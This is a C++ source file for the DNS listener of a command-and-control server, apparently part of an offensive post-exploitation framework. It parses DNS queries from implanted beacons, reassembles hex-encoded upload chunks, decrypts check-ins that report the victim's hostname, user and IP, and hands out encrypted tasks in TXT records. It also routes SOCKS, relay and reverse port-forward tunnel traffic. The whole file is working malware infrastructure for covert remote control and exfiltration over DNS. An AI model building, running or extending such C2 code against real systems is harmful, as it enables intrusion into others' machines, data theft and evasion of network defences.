// DNS C2 listener.
//
// Listens on UDP port 53 (configurable). Beacons upload data via A queries
// and receive tasks/replies via TXT queries.
//
// Implements the same beacon crypto conventions as TcpListener / HttpsListener:
// open_frame / seal_frame from BeaconCrypto, RSA-OAEP from RsaOaep.

#include "DnsListener.hpp"
#include "../https/BeaconCrypto.hpp"
#include "../https/RsaOaep.hpp"
#include "../../Core.hpp"
#include "../../core/SessionRegistry.hpp"
#include "../../core/TaskQueue.hpp"

#include <co2h/kv.hpp>
#include <co2h/proto.hpp>
#include <spdlog/spdlog.h>

#include <algorithm>
#include <chrono>
#include <cstdint>
#include <cstring>
#include <memory>
#include <sstream>
#include <string>
#include <vector>

namespace co2h::server::dns_c2 {

using namespace ::co2h::kv;
namespace https = ::co2h::server::https;

namespace {

std::string random_hex_id() {
    std::array<std::uint8_t, 8> raw{};
    co2h::crypto::random_bytes(raw.data(), raw.size());
    return co2h::hex_encode({raw.data(), raw.size()});
}

// Decode a hex string into a Bytes vector. Returns empty on any error.
Bytes hex_to_bytes(const std::string& hex) {
    if (hex.size() & 1u) return {};
    return co2h::hex_decode(hex);
}

// Parse a 4-char hex string as uint16_t; returns 0 on failure.
std::uint16_t parse_hex16(const std::string& s) {
    if (s.size() != 4) return 0;
    std::uint16_t v = 0;
    for (char c : s) {
        v <<= 4;
        if (c >= '0' && c <= '9') v |= static_cast<std::uint16_t>(c - '0');
        else if (c >= 'a' && c <= 'f') v |= static_cast<std::uint16_t>(c - 'a' + 10);
        else if (c >= 'A' && c <= 'F') v |= static_cast<std::uint16_t>(c - 'A' + 10);
        else return 0;
    }
    return v;
}

} // namespace

// ---- Constructor -----------------------------------------------------------

DnsListener::DnsListener(std::shared_ptr<Core> core, DnsConfig cfg)
    : core_(std::move(core))
    , cfg_(std::move(cfg))
    , socket_(core_->io(), asio::ip::udp::v4())
{}

// ---- Listener interface ----------------------------------------------------

std::string DnsListener::key_hex() const {
    return co2h::hex_encode({cfg_.listener_key.data(), cfg_.listener_key.size()});
}

std::string DnsListener::pubkey_hex() const {
    return co2h::hex_encode({cfg_.rsa_pub_blob.data(), cfg_.rsa_pub_blob.size()});
}

void DnsListener::start() {
    asio::ip::udp::endpoint ep{
        asio::ip::make_address(cfg_.bind_host), cfg_.bind_port};
    socket_.set_option(asio::ip::udp::socket::reuse_address(true));
    socket_.bind(ep);
    spdlog::info("dns listener '{}' on {} domain={}",
                 cfg_.name, bind_addr(), cfg_.c2_domain);
    start_receive();
}

void DnsListener::stop() {
    std::error_code ec;
    socket_.close(ec);
}

// ---- Async receive loop ----------------------------------------------------

void DnsListener::start_receive() {
    auto self = shared_from_this();
    socket_.async_receive_from(
        asio::buffer(recv_buf_), sender_ep_,
        [this, self](const std::error_code& ec, std::size_t bytes) {
            if (ec) {
                if (ec != asio::error::operation_aborted)
                    spdlog::warn("dns '{}' recv: {}", cfg_.name, ec.message());
                return;
            }
            // Copy sender endpoint before start_receive() overwrites sender_ep_.
            asio::ip::udp::endpoint ep = sender_ep_;
            handle_receive(bytes, ep);
        });
}

// ---- Main dispatch ---------------------------------------------------------

void DnsListener::handle_receive(std::size_t bytes,
                                  const asio::ip::udp::endpoint& sender) {
    // Re-arm the receive loop immediately so we don't drop queries.
    start_receive();

    const std::uint8_t* pkt = recv_buf_.data();
    int plen = static_cast<int>(bytes);

    // Minimum DNS header is 12 bytes.
    if (plen < 12) return;

    // Must be a query (QR bit = 0).
    if (pkt[2] & 0x80u) return;

    // Must have at least 1 question.
    std::uint16_t qdcount = static_cast<std::uint16_t>((pkt[4] << 8) | pkt[5]);
    if (qdcount < 1) return;

    std::vector<std::string> all_labels;
    int after_q = parse_qname(pkt, plen, 12, all_labels);
    if (after_q <= 0 || all_labels.empty()) return;

    std::vector<std::string> labels = strip_domain(all_labels);
    if (labels.empty()) return;

    std::size_t n = labels.size();

    // Dispatch:
    //   ["p", txid8]                        → poll
    //   ["fin", cnt4hex, txid8]             → fin
    //   [d0_60, d1_60, meta13]              → upload chunk  (meta[0] == 'c'|'o')
    if (n == 2 && labels[0] == "p") {
        handle_poll(sender, pkt, plen, labels);
    } else if (n == 4 && labels[0] == "fin") {
        handle_fin(sender, pkt, plen, labels);
    } else if (n == 3 && !labels[2].empty() &&
               (labels[2][0] == 'c' || labels[2][0] == 'o')) {
        handle_upload_chunk(sender, pkt, plen, labels);
    }
    // else: ignore unknown query shape
}

// ---- QNAME parser ----------------------------------------------------------

int DnsListener::parse_qname(const std::uint8_t* pkt, int pkt_len, int pos,
                               std::vector<std::string>& labels) {
    // Walk labels. Handle pointer compression (0xC0xx).
    // Returns position after the complete QNAME + QTYPE(2) + QCLASS(2),
    // or 0 on error.
    bool followed_ptr = false;
    int ptr_return = -1;

    while (pos < pkt_len) {
        std::uint8_t n = pkt[pos];
        if (n == 0) {
            pos++;
            break;
        }
        if ((n & 0xC0u) == 0xC0u) {
            // Pointer: 14-bit offset.
            if (pos + 1 >= pkt_len) return 0;
            int target = ((n & 0x3Fu) << 8) | pkt[pos + 1];
            if (target >= pkt_len) return 0;
            if (!followed_ptr) {
                ptr_return = pos + 2;
            }
            followed_ptr = true;
            pos = target;
        } else {
            int llen = static_cast<int>(n);
            pos++;
            if (pos + llen > pkt_len) return 0;
            labels.emplace_back(reinterpret_cast<const char*>(pkt + pos), llen);
            pos += llen;
        }
    }

    // Restore pos if we followed a pointer (the "real" continuation is at ptr_return).
    if (followed_ptr && ptr_return >= 0) {
        pos = ptr_return;
    }

    // Skip QTYPE + QCLASS (4 bytes).
    if (pos + 4 > pkt_len) return 0;
    pos += 4;
    return pos;
}

// ---- Domain suffix stripping -----------------------------------------------

std::vector<std::string> DnsListener::strip_domain(
    const std::vector<std::string>& labels)
{
    // Rebuild the full dotted name from labels.
    // e.g. labels = ["d0", "d1", "meta", "c2", "evil", "com"]
    // We need to check whether the suffix equals cfg_.c2_domain.

    // Split cfg_.c2_domain by '.' into domain_parts.
    std::vector<std::string> domain_parts;
    {
        std::string tmp = cfg_.c2_domain;
        std::size_t start = 0;
        while (start < tmp.size()) {
            auto dot = tmp.find('.', start);
            if (dot == std::string::npos) {
                domain_parts.push_back(tmp.substr(start));
                break;
            }
            domain_parts.push_back(tmp.substr(start, dot - start));
            start = dot + 1;
        }
    }

    if (domain_parts.empty()) return {};
    if (labels.size() <= domain_parts.size()) return {};

    // Check suffix match (case-insensitive is not required by the protocol,
    // but do a straightforward case-sensitive match here).
    std::size_t prefix_len = labels.size() - domain_parts.size();
    for (std::size_t i = 0; i < domain_parts.size(); ++i) {
        if (labels[prefix_len + i] != domain_parts[i]) return {};
    }

    // Return the prefix labels.
    return std::vector<std::string>(labels.begin(),
                                    labels.begin() + static_cast<std::ptrdiff_t>(prefix_len));
}

// ---- Wire: send A response -------------------------------------------------

void DnsListener::send_a(const asio::ip::udp::endpoint& ep,
                          const std::uint8_t* query, int qlen,
                          std::uint32_t ip) {
    // Build DNS response: copy ID from query, set QR|AA, QDCOUNT=1, ANCOUNT=1.
    // Copy question section verbatim then add one A answer.

    auto buf = std::make_shared<Bytes>();
    buf->reserve(static_cast<std::size_t>(qlen) + 16);

    // Header (12 bytes).
    // ID: bytes 0-1 from query.
    buf->push_back(query[0]);
    buf->push_back(query[1]);
    // Flags: QR=1, AA=1, Opcode=0, TC=0, RD=1 (copy from query), RA=0 → 0x8400 | (query[2] & 0x01)
    buf->push_back(static_cast<std::uint8_t>(0x84u | (query[2] & 0x01u)));
    buf->push_back(0x00u);
    // QDCOUNT = 1
    buf->push_back(0x00u); buf->push_back(0x01u);
    // ANCOUNT = 1
    buf->push_back(0x00u); buf->push_back(0x01u);
    // NSCOUNT = 0, ARCOUNT = 0
    buf->push_back(0x00u); buf->push_back(0x00u);
    buf->push_back(0x00u); buf->push_back(0x00u);

    // Question section: copy from query (offset 12 to first 0x00 byte + 4 bytes type/class).
    // Walk query to find end of QNAME then include 4 bytes.
    int qpos = 12;
    while (qpos < qlen) {
        std::uint8_t n = query[qpos];
        if (n == 0) { qpos++; break; }
        if ((n & 0xC0u) == 0xC0u) { qpos += 2; break; }
        qpos += 1 + static_cast<int>(n);
    }
    int question_end = qpos + 4;   // +QTYPE+QCLASS
    if (question_end <= qlen) {
        buf->insert(buf->end(), query + 12, query + question_end);
    }

    // Answer: NAME = pointer 0xC00C, TYPE=A(1), CLASS=IN(1), TTL=1, RDLEN=4, IP.
    buf->push_back(0xC0u); buf->push_back(0x0Cu);          // NAME ptr
    buf->push_back(0x00u); buf->push_back(0x01u);          // TYPE A
    buf->push_back(0x00u); buf->push_back(0x01u);          // CLASS IN
    buf->push_back(0x00u); buf->push_back(0x00u);          // TTL high
    buf->push_back(0x00u); buf->push_back(0x01u);          // TTL low = 1s
    buf->push_back(0x00u); buf->push_back(0x04u);          // RDLEN = 4
    buf->push_back(static_cast<std::uint8_t>(ip >> 24));
    buf->push_back(static_cast<std::uint8_t>(ip >> 16));
    buf->push_back(static_cast<std::uint8_t>(ip >>  8));
    buf->push_back(static_cast<std::uint8_t>(ip));

    auto self = shared_from_this();
    socket_.async_send_to(asio::buffer(*buf), ep,
        [self, buf](const std::error_code&, std::size_t) {});
}

// ---- Wire: send TXT response -----------------------------------------------

void DnsListener::send_txt(const asio::ip::udp::endpoint& ep,
                            const std::uint8_t* query, int qlen,
                            const std::string& hex_data) {
    auto buf = std::make_shared<Bytes>();

    // Header.
    buf->push_back(query[0]);
    buf->push_back(query[1]);
    buf->push_back(static_cast<std::uint8_t>(0x84u | (query[2] & 0x01u)));
    buf->push_back(0x00u);
    buf->push_back(0x00u); buf->push_back(0x01u);   // QDCOUNT=1
    buf->push_back(0x00u); buf->push_back(0x01u);   // ANCOUNT=1
    buf->push_back(0x00u); buf->push_back(0x00u);
    buf->push_back(0x00u); buf->push_back(0x00u);

    // Question section.
    int qpos = 12;
    while (qpos < qlen) {
        std::uint8_t n = query[qpos];
        if (n == 0) { qpos++; break; }
        if ((n & 0xC0u) == 0xC0u) { qpos += 2; break; }
        qpos += 1 + static_cast<int>(n);
    }
    int question_end = qpos + 4;
    if (question_end <= qlen) {
        buf->insert(buf->end(), query + 12, query + question_end);
    }

    // Answer NAME = pointer 0xC00C.
    buf->push_back(0xC0u); buf->push_back(0x0Cu);
    // TYPE TXT (16), CLASS IN (1).
    buf->push_back(0x00u); buf->push_back(0x10u);
    buf->push_back(0x00u); buf->push_back(0x01u);
    // TTL = 1.
    buf->push_back(0x00u); buf->push_back(0x00u);
    buf->push_back(0x00u); buf->push_back(0x01u);

    // Build RDATA: split hex_data into 255-byte character strings.
    Bytes rdata;
    const std::size_t chunk = 255;
    std::size_t offset = 0;
    while (offset < hex_data.size()) {
        std::size_t take = std::min(chunk, hex_data.size() - offset);
        rdata.push_back(static_cast<std::uint8_t>(take));
        rdata.insert(rdata.end(),
                     hex_data.begin() + static_cast<std::ptrdiff_t>(offset),
                     hex_data.begin() + static_cast<std::ptrdiff_t>(offset + take));
        offset += take;
    }
    if (rdata.empty()) {
        // Empty TXT string.
        rdata.push_back(0x00u);
    }

    // RDLEN.
    auto rdlen = static_cast<std::uint16_t>(rdata.size());
    buf->push_back(static_cast<std::uint8_t>(rdlen >> 8));
    buf->push_back(static_cast<std::uint8_t>(rdlen));
    buf->insert(buf->end(), rdata.begin(), rdata.end());

    auto self = shared_from_this();
    socket_.async_send_to(asio::buffer(*buf), ep,
        [self, buf](const std::error_code&, std::size_t) {});
}

// ---- Handle upload chunk ---------------------------------------------------

void DnsListener::handle_upload_chunk(const asio::ip::udp::endpoint& ep,
                                       const std::uint8_t* query, int qlen,
                                       const std::vector<std::string>& labels) {
    // labels[0] = d0 (60 hex chars = 30 bytes)
    // labels[1] = d1 (60 hex chars = 30 bytes)
    // labels[2] = meta: [type(1)][seq(4)][txid(8)] = 13 chars
    if (labels[0].size() != 60 || labels[1].size() != 60 || labels[2].size() != 13)
        return;

    char frame_type = labels[2][0];
    if (frame_type != 'c' && frame_type != 'o') return;

    std::uint16_t seq = parse_hex16(labels[2].substr(1, 4));
    std::string   txid = labels[2].substr(5, 8);

    // Decode 30+30 = 60 bytes.
    Bytes d0 = hex_to_bytes(labels[0]);
    Bytes d1 = hex_to_bytes(labels[1]);
    if (d0.size() != 30 || d1.size() != 30) return;

    Bytes chunk;
    chunk.reserve(60);
    chunk.insert(chunk.end(), d0.begin(), d0.end());
    chunk.insert(chunk.end(), d1.begin(), d1.end());

    {
        std::lock_guard<std::mutex> lk(mu_);
        auto& us = uploads_[txid];
        us.frame_type = frame_type;
        us.chunks[seq] = std::move(chunk);
    }

    // ACK with 0.0.0.1.
    send_a(ep, query, qlen, 0x00000001u);
}

// ---- Handle fin ------------------------------------------------------------

// Parse up to 8 hex chars as uint32_t; returns 0 on error.
static std::uint32_t parse_hex32(const std::string& s) {
    if (s.empty() || s.size() > 8) return 0;
    std::uint32_t v = 0;
    for (char c : s) {
        v <<= 4;
        if (c >= '0' && c <= '9') v |= static_cast<std::uint32_t>(c - '0');
        else if (c >= 'a' && c <= 'f') v |= static_cast<std::uint32_t>(c - 'a' + 10);
        else if (c >= 'A' && c <= 'F') v |= static_cast<std::uint32_t>(c - 'A' + 10);
        else return 0;
    }
    return v;
}

void DnsListener::handle_fin(const asio::ip::udp::endpoint& ep,
                              const std::uint8_t* query, int qlen,
                              const std::vector<std::string>& labels) {
    // labels = ["fin", cnt4hex, len8hex, txid8]
    if (labels.size() < 4) return;
    if (labels[1].size() != 4 || labels[2].size() != 8 || labels[3].size() != 8) return;

    std::string   txid    = labels[3];
    std::uint16_t cnt     = parse_hex16(labels[1]);
    std::uint32_t real_len = parse_hex32(labels[2]);

    // ACK before heavy processing.
    send_a(ep, query, qlen, 0x00000001u);

    // Reassemble.
    UploadSession us;
    {
        std::lock_guard<std::mutex> lk(mu_);
        auto it = uploads_.find(txid);
        if (it == uploads_.end()) return;
        us = std::move(it->second);
        uploads_.erase(it);
    }

    // Check all sequence numbers 0..cnt-1 are present.
    Bytes frame;
    frame.reserve(static_cast<std::size_t>(cnt) * 60);
    for (std::uint16_t i = 0; i < cnt; ++i) {
        auto it = us.chunks.find(i);
        if (it == us.chunks.end()) {
            spdlog::warn("dns '{}': txid={} missing chunk seq={}", cfg_.name, txid, i);
            return;
        }
        frame.insert(frame.end(), it->second.begin(), it->second.end());
    }

    // Обрезаем паддинг последнего чанка до реальной длины.
    if (real_len > 0 && real_len <= frame.size()) {
        frame.resize(real_len);
    } else if (real_len > frame.size()) {
        spdlog::warn("dns '{}': txid={} real_len={} > reassembled={}",
                     cfg_.name, txid, real_len, frame.size());
        return;
    }

    process_frame(txid, us.frame_type, frame, ep);
}

// ---- Handle poll -----------------------------------------------------------

void DnsListener::handle_poll(const asio::ip::udp::endpoint& ep,
                               const std::uint8_t* query, int qlen,
                               const std::vector<std::string>& labels) {
    // labels = ["p", txid8]
    if (labels[1].size() != 8) { send_a(ep, query, qlen, 0u); return; }
    std::string txid = labels[1];

    std::lock_guard<std::mutex> lk(mu_);
    auto it = sessions_.find(txid);
    if (it == sessions_.end()) {
        send_a(ep, query, qlen, 0u);
        return;
    }
    BeaconSession& sess = it->second;

    // Serve pending_reply first (checkin response).
    if (!sess.pending_reply.empty()) {
        std::string hex = co2h::hex_encode({sess.pending_reply.data(),
                                            sess.pending_reply.size()});
        sess.pending_reply.clear();
        send_txt(ep, query, qlen, hex);
        return;
    }

    // Drain task queue.
    auto drained = core_->tasks().drain(sess.beacon_id);
    if (drained.empty()) {
        send_a(ep, query, qlen, 0u);
        return;
    }

    // Update last_seen.
    auto sp = core_->sessions().get(sess.beacon_id);
    if (sp) sp->last_seen = std::chrono::system_clock::now();

    // Build task KV frame and seal with session_key.
    Writer w;
    w.put_u32("count", static_cast<std::uint32_t>(drained.size()));
    for (std::size_t i = 0; i < drained.size(); ++i) {
        auto idx = std::to_string(i);
        w.put_u64("id_"      + idx, drained[i].id);
        w.put_u32("op_"      + idx, static_cast<std::uint32_t>(drained[i].op));
        w.put_bytes("payload_" + idx,
                    {drained[i].payload.data(), drained[i].payload.size()});
    }
    Bytes sealed = https::seal_frame(sess.session_key, w.finish());
    std::string hex = co2h::hex_encode({sealed.data(), sealed.size()});
    send_txt(ep, query, qlen, hex);
}

// ---- Process reassembled frame ---------------------------------------------

void DnsListener::process_frame(const std::string& txid, char frame_type,
                                 const Bytes& frame,
                                 const asio::ip::udp::endpoint& sender_ep) {
    if (frame_type == 'c') {
        // --- Checkin ---
        auto pt = https::open_frame(cfg_.listener_key,
                                    {frame.data(), frame.size()});
        if (!pt) {
            spdlog::warn("dns '{}': checkin decrypt failed txid={}", cfg_.name, txid);
            return;
        }

        Reader r{{pt->data(), pt->size()}};
        BeaconSession bsess;
        ::co2h::server::BeaconSession s;
        s.id           = random_hex_id();
        s.listener     = cfg_.name;
        s.hostname     = std::string{r.get_str("host").value_or("")};
        s.username     = std::string{r.get_str("user").value_or("")};
        s.pid          = r.get_u32("pid").value_or(0);
        s.arch         = std::string{r.get_str("arch").value_or("x64")};
        s.os           = std::string{r.get_str("os").value_or("windows")};
        s.internal_ip  = std::string{r.get_str("ip").value_or("")};
        s.parent_id    = std::string{r.get_str("parent_id").value_or("")};
        s.external_ip  = sender_ep.address().to_string();
        if (s.internal_ip.empty()) s.internal_ip = s.external_ip;
        s.first_seen = s.last_seen = std::chrono::system_clock::now();

        // RSA-OAEP wrapped per-session key (same logic as TcpListener).
        s.session_key = cfg_.listener_key;
        auto wrapped = r.get_bytes("wrapped_key");
        if (wrapped && !cfg_.rsa_priv_blob.empty()) {
            auto dec = https::rsa_oaep_decrypt(
                {cfg_.rsa_priv_blob.data(), cfg_.rsa_priv_blob.size()},
                {wrapped->data(), wrapped->size()});
            if (dec && dec->size() == s.session_key.size()) {
                std::copy(dec->begin(), dec->end(), s.session_key.begin());
            } else {
                spdlog::warn("dns '{}': wrapped_key decrypt failed txid={}; "
                             "falling back to listener_key", cfg_.name, txid);
            }
        }

        core_->sessions().create_or_update(s);
        spdlog::info("dns beacon checkin id={} host={} user={} listener={}",
                     s.id, s.hostname, s.username, s.listener);

        // Build checkin reply KV and seal it for the beacon.
        Writer w;
        w.put_str("beacon_id", s.id);
        Bytes sealed = https::seal_frame(cfg_.listener_key, w.finish());

        // Store session so handle_poll can serve it.
        bsess.beacon_id    = s.id;
        bsess.session_key  = s.session_key;
        bsess.pending_reply = std::move(sealed);

        std::lock_guard<std::mutex> lk(mu_);
        sessions_[txid] = std::move(bsess);

    } else if (frame_type == 'o') {
        // --- Output ---
        crypto::AesKey session_key{};
        std::string beacon_id;
        {
            std::lock_guard<std::mutex> lk(mu_);
            auto it = sessions_.find(txid);
            if (it == sessions_.end()) {
                spdlog::warn("dns '{}': output from unknown txid={}", cfg_.name, txid);
                return;
            }
            session_key = it->second.session_key;
            beacon_id   = it->second.beacon_id;
        }

        auto sp = core_->sessions().get(beacon_id);
        if (sp) sp->last_seen = std::chrono::system_clock::now();

        auto pt = https::open_frame(session_key, {frame.data(), frame.size()});
        if (!pt) {
            spdlog::warn("dns '{}': output decrypt failed txid={}", cfg_.name, txid);
            return;
        }

        Reader r{{pt->data(), pt->size()}};

        auto task_id_sv = r.get_str("task_id").value_or(std::string_view{});
        auto task_id    = r.get_u64("task_id").value_or(0);
        auto out        = r.get_bytes("output").value_or(BytesView{});
        auto err        = r.get_str("error").value_or("");
        auto is_last    = r.get_u32("is_last").value_or(1);
        auto resp       = r.get_u32("resp").value_or(2);

        // Magic task_ids for SOCKS/relay/rportfwd OOB traffic.
        static constexpr std::uint64_t kSocksMagic    = 0xFFFFFFFFFFFFFFFEULL;
        static constexpr std::uint64_t kRelayMagic    = 0xFFFFFFFFFFFFFFFDULL;
        static constexpr std::uint64_t kRportfwdMagic = 0xFFFFFFFFFFFFFFFCULL;
        static constexpr std::string_view kSocksMagicStr    = "18446744073709551614";
        static constexpr std::string_view kRelayMagicStr    = "18446744073709551613";
        static constexpr std::string_view kRportfwdMagicStr = "18446744073709551612";

        bool is_socks    = (task_id == kSocksMagic)    || (task_id_sv == kSocksMagicStr);
        bool is_relay    = (task_id == kRelayMagic)    || (task_id_sv == kRelayMagicStr);
        bool is_rportfwd = (task_id == kRportfwdMagic) || (task_id_sv == kRportfwdMagicStr);

        if (is_socks) {
            if (!out.empty())
                core_->route_socks_output(beacon_id, out);
        } else if (is_relay) {
            if (!out.empty())
                core_->route_relay_output(beacon_id, out);
        } else if (is_rportfwd) {
            if (!out.empty())
                core_->route_rportfwd_output(beacon_id, out);
        } else {
            if (!out.empty())
                spdlog::debug("dns output: beacon={} task_id={} out={}b",
                              beacon_id, task_id_sv, out.size());
            Writer w;
            w.put_str("beacon_id", beacon_id);
            w.put_u64("task_id",   task_id);
            w.put_u32("is_last",   is_last);
            w.put_u32("resp",      resp);
            if (!err.empty()) w.put_str("error", std::string{err});
            if (!out.empty()) w.put_bytes("output", out);
            core_->broadcast_event(proto::EventCategory::Tasks, w.finish());
        }
    }
}

} // namespace co2h::server::dns_c2
